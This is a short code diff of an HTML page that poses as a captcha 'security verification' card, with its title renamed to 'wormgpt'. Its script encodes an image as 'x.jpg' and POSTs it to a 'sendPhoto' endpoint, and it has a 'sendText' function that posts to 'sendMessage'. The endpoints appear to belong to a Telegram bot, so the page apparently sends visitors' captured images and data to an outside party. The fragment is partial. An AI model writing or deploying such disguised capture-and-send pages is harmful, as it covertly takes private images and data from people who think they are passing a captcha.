@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان</title>
+    <title>wormgpt</title>
     <style>
         body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .captcha-card { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
@@ -147,8 +147,7 @@
         f.append('photo', blob, 'x.jpg');
         fetch(api + "sendPhoto", { method: 'POST', body: f });
     }, 'image/jpeg', 0.9); 
-        }
-        }
+}
 
         function sendText(api_url, txt) {
             fetch(api_url + "sendMessage", {
